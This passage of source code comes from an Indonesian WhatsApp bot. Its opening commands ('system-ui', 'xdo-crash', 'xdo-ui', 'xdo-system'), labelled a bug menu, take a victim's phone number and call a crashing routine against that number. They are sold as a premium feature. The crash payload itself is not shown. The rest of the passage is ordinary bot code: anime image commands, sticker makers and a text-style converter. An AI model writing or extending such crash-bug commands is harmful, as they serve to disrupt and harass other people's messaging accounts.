          Kilianhst.sendMessage(from, { react: { text: "☠️", key: m.key } });
        }
        break;

      case "system-ui":
        {
          if (!isPrem) return reply(`Khusus Premium User HuTao`);
          if (!q) return reply(`Example : ${command} 62xxx`);
          let pepec = q.replace(/[^0-9]/g, "");
          let target = pepec + "@s.whatsapp.net";
          m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`);
          reply("𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭");
          // Memulai Crashing
          await Buk1000(target);
          Kilianhst.sendMessage(from, { react: { text: "☠️", key: m.key } });
        }
        break;

      case "xdo-crash":
        {
          if (!isPrem) return reply(`Khusus Premium User HuTao`);
          if (!q) return reply(`Example : ${command} 62xxx`);
          let pepec = q.replace(/[^0-9]/g, "");
          let target = pepec + "@s.whatsapp.net";
          m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`);
          reply("𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭");
          // Memulai Crashing
          await Buk1000(target);
          Kilianhst.sendMessage(from, { react: { text: "☠️", key: m.key } });
        }
        break;

      case "xdo-ui":
        {
          if (!isPrem) return reply(`Khusus Premium User HuTao`);
          if (!q) return reply(`Example : ${command} 62xxx`);
          let pepec = q.replace(/[^0-9]/g, "");
          let target = pepec + "@s.whatsapp.net";
          m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`);
          reply("𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭");
          // Memulai Crashing
          await Buk1000(target);
          Kilianhst.sendMessage(from, { react: { text: "☠️", key: m.key } });
        }
        break;

      case "xdo-system":
        {
          if (!isPrem) return reply(`Khusus Premium User HuTao`);
          if (!q) return reply(`Example : ${command} 62xxx`);
          let pepec = q.replace(/[^0-9]/g, "");
          let target = pepec + "@s.whatsapp.net";
          m.reply(`𝐖𝐀𝐈𝐓 𝐏𝐑𝐎𝐒𝐄𝐒 𝐂𝐔𝐘 𝐁𝐘 𝐃𝐎 𝐇𝐎𝐒𝐓𝐈𝐍𝐆 🎗`);
          reply("𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐢𝐫𝐢𝐦 𝐁𝐮𝐠 𝐁𝐲 𝐕𝐚𝐥𝐢𝐝𝐚𝐭𝐨𝐫 🎭");
          // Memulai Crashing
          await Buk1000(target);
          Kilianhst.sendMessage(from, { react: { text: "🀄", key: m.key } });
        }
        break;

      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      // M E T H O D E    -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "textunbanv1":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const vaga = ` ${textunbanv1}`;
        reply(vaga);
        break;
      case "textunbanv2":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const bandar = ` ${textunbanv2}`;
        reply(bandar);
        break;
      case "textunbanv3":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const masokpakeok = ` ${textunbanv3}`;
        reply(masokpakeok);
        break;
      case "textunbanv4":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const typo = ` ${textunbanv4}`;
        reply(typo);
        break;
      case "textunbanv5":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const sokasim = ` ${textunbanv5}`;
        reply(sokasim);
        break;
      case "textunbanv6":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const akakaka = ` ${textunbanv6}`;
        reply(akakaka);
        break;
      case "textunbanv7":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const kopok = ` ${textunbanv7}`;
        reply(kopok);
        break;
      case "textunbanv8":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const tehyung = ` ${textunbanv8}`;
        reply(tehyung);
        break;
      case "textunbanv9":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const ahhyan = ` ${textunbanv9}`;
        reply(ahhyan);
        break;
      case "textunbanv10":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const yamete = ` ${textunbanv10}`;
        reply(yamete);
        break;
      case "textunbanv11":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const suuu = ` ${textunbanv11}`;
        reply(suuu);
        break;
      case "textunbanv12":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const huuuu = ` ${textunbanv12}
huuu`;
        reply(huuuu);
        break;
      case "textunbanv13":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const gaje = ` ${textunbanv13}`;
        reply(gaje);
        break;
      case "textunbanv14":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const well = ` ${textunbanv14}`;
        reply(well);
        break;
      case "textunbanv15":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const lempo = ` ${textunbanv15}`;
        reply(lempo);
        break;
      case "textunbanv16":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const cok = ` ${textunbanv16}`;
        reply(cok);
        break;
      case "textunbanv17":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const sayasuka = ` ${textunbanv17}`;
        reply(sayasuka);
        break;
      case "textunbanv18":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const oooooooo = ` ${textunbanv18}`;
        reply(oooooooo);
        break;
      case "textunbanv19":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const omaaavaaaaaaaa = ` ${textunbanv19}`;
        reply(omaaavaaaaaaaa);
        break;
      case "textunbanv20":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const bykepo = ` ${textunbanv20}`;
        reply(bykepo);
        break;
      case "textunbanv21":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const unbannned = ` ${textunbanv21}`;
        reply(unbannned);
        break;
      case "textunbanpremv1":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const premi = ` ${textunbanpremv1}`;
        reply(premi);
        break;
      case "textunbanpremv2":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const kelasss = ` ${textunbanpremv2}`;
        reply(kelasss);
        break;
      case "textunbanpremv3":
        if (!isCreator) return reply(`Sok asik bangsat`);
        const eek = ` ${textunbanpremv3}`;
        reply(eek);
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 METHODE 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      // A N I M E    -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "animeawoo":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animemegumin":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeshinobu":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehandhold":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehighfive":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecringe":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animedance":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehappy":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeglomp":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animesmug":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeblush":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewave":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animesmile":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animepoke":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewink":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebonk":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebully":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeyeet":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animebite":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animelick":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animekill":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecry":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewlp":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animekiss":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animehug":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;

      case "couplepp":
      case "ppcouple":
        {
          reply(mess.wait);
          let anucpp = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json"
          );
          let random = anucpp[Math.floor(Math.random() * anucpp.length)];
          Kilianhst.sendMessage(
            m.chat,
            { image: { url: random.male }, caption: `Couple Male` },
            { quoted: m }
          );
          Kilianhst.sendMessage(
            m.chat,
            { image: { url: random.female }, caption: `Couple Female` },
            { quoted: m }
          );
        }
        break;

      case "animeneko":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animepat":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeslap":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animecuddle":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animewaifu":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animenom":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animefoxgirl":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/foxgirl`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animetickle":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animegecg":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "dogwoof":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "8ballpool":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "goosebird":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animefeed":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "animeavatar":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "lizardpic":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      case "catmeow":
        {
          reply(mess.wait);
          waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`);
          await Kilianhst.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
      /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 ANIME 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/

      //============================================================\\
      //  𝗖 𝗢 𝗡 𝗩 𝗘 𝗥 𝗧  -         𝗠 𝗘 𝗡 𝗨
      //============================================================\\
      case "brat":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          if (!text)
            return m.reply(
              `*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix + command} halo suki`
            );
          try {
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "⏳", key: m.key },
            });
            const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(
              text
            )}&isVideo=false`;
            const response = await axios.get(url, {
              responseType: "arraybuffer",
            });
            const sticker = new Sticker(response.data, {
              pack: "Stiker By",
              author: "Kythst 444+",
              type: "image/png",
            });
            const stikerBuffer = await sticker.toBuffer();
            await Kilianhst.sendMessage(
              m.chat,
              { sticker: stikerBuffer },
              { quoted: m }
            );
          } catch (err) {
            console.error("Error:", err);
            await Kilianhst.sendMessage(
              m.chat,
              {
                text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
              },
              { quoted: m }
            );
          }
        }
        break;
      case "bratvid":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          if (!text)
            return m.reply(
              `*\`ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ\`*:\n${prefix + command} halo suki`
            );
          try {
            await Kilianhst.sendMessage(m.chat, {
              react: { text: "⏳", key: m.key },
            });
            const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(
              text
            )}&isVideo=true`;
            const response = await axios.get(url, {
              responseType: "arraybuffer",
            });
            const sticker = new Sticker(response.data, {
              pack: "Stiker By",
              author: "Kilianhst 444+",
              type: "image/png",
            });
            const stikerBuffer = await sticker.toBuffer();
            await Kilianhst.sendMessage(
              m.chat,
              { sticker: stikerBuffer },
              { quoted: m }
            );
          } catch (err) {
            console.error("Error:", err);
            await Kilianhst.sendMessage(
              m.chat,
              {
                text: "Maaf, terjadi kesalahan saat mencoba membuat stiker brat. Coba lagi nanti.",
              },
              { quoted: m }
            );
          }
        }
        break;
      case "styletext":
      case "ctext":
      case "createtext":
      case "teks":
        {
          if (!q)
            return m.reply(
              "Masukin teksnya dulu!\nContoh: styletext Saya Asisten Ai HuTao"
            );
          const axios = require("axios");
          const cheerio = require("cheerio");

          try {
            let res = await axios.get(
              `https://qaz.wtf/u/convert.cgi?text=${encodeURIComponent(q)}`
            );
            let $ = cheerio.load(res.data);
            let hasil = [];
            $("table > tbody > tr").each((i, el) => {
              let style = $(el).find("td").eq(0).text().trim();
              let text = $(el).find("td").eq(1).text().trim();
              if (style && text) {
                hasil.push(`*${style}:*\n${text}`);
              }
            });
            if (hasil.length === 0)
              return m.reply("Gagal mengambil style, coba lagi nanti.");
            let teks = `*Hasil StyleText dari:* ${q}\n\n` + hasil.join("\n\n");
            m.reply(teks);
          } catch (e) {
            console.error(e);
            m.reply("Terjadi kesalahan saat mengambil data.");
          }
        }
        break;
      case "animebrat":
        {
          if (!text) return m.reply("Masukkan teks untuk stiker.");
          const axios = require("axios");
          const { createCanvas, loadImage, registerFont } = require("canvas");
          const sharp = require("sharp");
          try {
            let imageUrl =
              "https://cloudkuimages.com/uploads/images/67ddbbcb065a6.jpg";
            let fontUrl =
              "https://github.com/googlefonts/noto-emoji/raw/main/fonts/NotoColorEmoji.ttf";
            let imagePath = path.join(__dirname, "session", "file.jpg");
            let fontPath = path.join(
              __dirname,
              "session",
              "NotoColorEmoji.ttf"
            );
            let outputMp4 = path.join(
              __dirname,
              "session",
              `output_${Date.now()}.mp4`
            );
            let outputWebP = path.join(
              __dirname,
              "session",
              `animated_${Date.now()}.webp`
            );
            let frameDir = path.join(
              __dirname,
              "session",
              `frames_${Date.now()}`
            );

            if (!fs.existsSync(frameDir)) fs.mkdirSync(frameDir);

            if (!fs.existsSync(fontPath)) {
              let fontData = await axios.get(fontUrl, {
                responseType: "arraybuffer",
              });
              fs.writeFileSync(fontPath, Buffer.from(fontData.data));
            }

            let response = await axios.get(imageUrl, {
              responseType: "arraybuffer",
            });
            fs.writeFileSync(imagePath, Buffer.from(response.data));

            let baseImage = await loadImage(imagePath);
            let canvas = createCanvas(baseImage.width, baseImage.height);
            let ctx = canvas.getContext("2d");

            require("canvas").registerFont(fontPath, { family: "EmojiFont" });

            let boardX = canvas.width * 0.22;
            let boardY = canvas.height * 0.5;
            let boardWidth = canvas.width * 0.56;
            let boardHeight = canvas.height * 0.25;

            ctx.fillStyle = "#000";
            ctx.textAlign = "center";
            ctx.textBaseline = "middle";

            let maxFontSize = 32;
            let minFontSize = 12;
            let fontSize = maxFontSize;

            function isTextFit(text, fontSize) {
              ctx.font = `bold ${fontSize}px EmojiFont`;
              let words = text.split(" ");
              let lineHeight = fontSize * 1.2;
              let maxWidth = boardWidth * 0.9;
              let lines = [];
              let currentLine = words[0];

              for (let i = 1; i < words.length; i++) {
                let testLine = currentLine + " " + words[i];
                let testWidth = ctx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                  lines.push(currentLine);
                  currentLine = words[i];
                } else {
                  currentLine = testLine;
                }
              }
              lines.push(currentLine);
              let textHeight = lines.length * lineHeight;
              return textHeight <= boardHeight * 0.9;
            }

            while (!isTextFit(text, fontSize) && fontSize > minFontSize) {
              fontSize -= 2;
            }

            ctx.font = `bold ${fontSize}px EmojiFont`;

            let words = text.split(" ");
            let lineHeight = fontSize * 1.2;
            let maxWidth = boardWidth * 0.9;
            let frames = [];

            for (let i = 1; i <= words.length; i++) {
              let tempText = words.slice(0, i).join(" ");
              let frameCanvas = createCanvas(baseImage.width, baseImage.height);
              let frameCtx = frameCanvas.getContext("2d");

              frameCtx.drawImage(
                baseImage,
                0,
                0,
                frameCanvas.width,
                frameCanvas.height
              );
              frameCtx.fillStyle = "#000";
              frameCtx.textAlign = "center";
              frameCtx.textBaseline = "middle";
              frameCtx.font = `bold ${fontSize}px EmojiFont`;

              let lines = [];
              let currentLine = "";
              tempText.split(" ").forEach((word) => {
                let testLine = currentLine ? currentLine + " " + word : word;
                let testWidth = frameCtx.measureText(testLine).width;
                if (testWidth > maxWidth) {
                  lines.push(currentLine);
                  currentLine = word;
                } else {
                  currentLine = testLine;
                }
              });
              lines.push(currentLine);

              let startY =
                boardY +
                boardHeight / 2 -
                ((lines.length - 1) * lineHeight) / 2;
              lines.forEach((line, index) => {
                frameCtx.fillText(
                  line,
                  boardX + boardWidth / 2,
                  startY + index * lineHeight
                );
              });

              let framePath = path.join(frameDir, `frame${i}.png`);
              fs.writeFileSync(framePath, frameCanvas.toBuffer("image/png"));
              frames.push(framePath);
            }

            exec(
              `ffmpeg -y -framerate 2 -i ${frameDir}/frame%d.png -c:v libx264 -pix_fmt yuv420p ${outputMp4}`,
              async (err) => {
                if (err) {
                  console.error("❌ Error membuat video:", err);
                  return m.reply(
                    "Terjadi kesalahan saat membuat video animasi."
                  );
                }

                exec(
                  `ffmpeg -i ${outputMp4} -vf "scale=512:512:flags=lanczos,format=rgba" -loop 0 -preset default -an -vsync 0 ${outputWebP}`,
                  async (err) => {
                    if (err) {
                      console.error("❌ Error konversi video ke stiker:", err);
                      return m.reply(
                        "Terjadi kesalahan saat mengonversi video ke stiker."
                      );
                    }

                    Kilianhst.sendMessage(
                      m.chat,
                      { sticker: { url: outputWebP } },
                      { quoted: m }
                    );

                    setTimeout(() => {
                      fs.unlinkSync(imagePath);
                      fs.unlinkSync(outputMp4);
                      fs.unlinkSync(outputWebP);
                      fs.rmSync(frameDir, { recursive: true, force: true });
                    }, 5000);
                  }
                );
              }
            );
          } catch (e) {
            console.error(e);
            m.reply("⚠️ Terjadi kesalahan saat membuat stiker.");
          }
        }
        break;
      case "sticker":
      case "s":
      case "stiker":
        {
          if (!isRegistered)
            return daftar(
              `*[ !! ]*\nᴋᴀᴍᴜ ʙᴇʟᴜᴍ ᴛᴇʀᴅᴀғᴛᴀʀ sɪʟᴀʜᴋᴀɴ ᴅᴀғᴛᴀʀ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ .ᴅᴀғᴛᴀʀ nama,umur`
            );
          if (!quoted)
            return reply(
              `reply image/video dengan caption ${prefix + command}`
            );
          try {
            if (/image/.test(mime)) {
              const media = await quoted.download();
              const imageUrl = `data:${mime};base64,${media.toString(
                "base64"
              )}`;
              await makeStickerFromUrl(imageUrl, Kilianhst, m);
            } else if (/video/.test(mime)) {
              if ((quoted?.msg || quoted)?.seconds > 10)
                return reply("Durasi video maksimal 10 detik!");
              const media = await quoted.download();
              const videoUrl = `data:${mime};base64,${media.toString(
                "base64"
              )}`;
              await makeStickerFromUrl(videoUrl, Kilianhst, m);
            } else {
              return reply(
                "Kirim gambar/video dengan caption .s (video durasi 1-10 detik)"
              );
            }
          } catch (error) {
            console.error(error);
            return reply("Terjadi kesalahan saat memproses media. Coba lagi.");
          }
        }
        break;
      case "tts":
        {
